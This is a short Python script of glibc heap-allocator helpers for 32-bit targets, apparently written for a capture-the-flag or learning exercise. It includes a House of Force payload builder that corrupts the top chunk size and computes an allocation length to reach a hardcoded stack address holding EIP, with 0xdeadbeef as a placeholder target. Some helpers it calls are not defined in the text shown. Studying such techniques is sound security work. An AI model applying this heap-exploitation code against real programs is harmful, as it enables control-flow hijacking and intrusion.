#!/bin/python3

import ctypes


def malloc_align(size):
    return (size + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK


def chunksize(size):
    # chunk contains the size field
    return malloc_align(size + 4)


def extractsize(size):
    return size & ~7


def request2size(req):
    t = req + SIZE_SZ + MALLOC_ALIGN_MASK
    if t < MINSIZE:
        return MINSIZE
    return t & ~MALLOC_ALIGN_MASK
  

def fastbin_index(sz):
    return (sz >> (4 if SIZE_SZ == 8 else 3)) - 2


def malloc_size_flags(size, non_main_arena=-1, is_mapped=-1, prev_inuse=-1):
    def setmask(bit, off):
        return ((not not bit) << off) if bit != -1 else size & (1 << off)
    flags = 0
    flags |= setmask(prev_inuse, 0)
    flags |= setmask(is_mapped, 1)
    flags |= setmask(non_main_arena, 2)
    return (size & ~7) | flags


def house_of_force(wilderness_offset):
    # TODO : make it generic 
    payload = b""

    # very large wilderness
    wilderness = chunksize(256) - 4
    payload += pad(wilderness)
    payload += set32(0xffffffff)

    # long malloc : after that, the next malloc will be at our desired addr
    # it just prints the length we need to alloc
    stack = 0xffffd7bc # contains eip
    last_chunk = 0x804a008 + chunksize(256)
    diff = stack - last_chunk - 8
    info("house of force length = %d" % diff)

    # data needs to be copied in the final malloc
    addr = b""
    addr += pad(4)
    addr += set32(0xdeadbeef)
    info(addr)

    return payload


sizeof = {
    "size_t": 4,
    "mutex_t": 4,
    "mfastbinptr": 4,
    "mchunkptr": 4,
}


SIZE_SZ = sizeof["size_t"]
MIN_CHUNK_SIZE = 2 * SIZE_SZ + 2 * sizeof["mchunkptr"]
MALLOC_ALIGNMENT = 2 * SIZE_SZ
MALLOC_ALIGN_MASK = MALLOC_ALIGNMENT - 1
NBINS = 128
MINSIZE = malloc_align(MIN_CHUNK_SIZE)
MAX_FAST_SIZE = int(80 * SIZE_SZ / 4)
NFASTBINS = fastbin_index(request2size(MAX_FAST_SIZE)) + 1

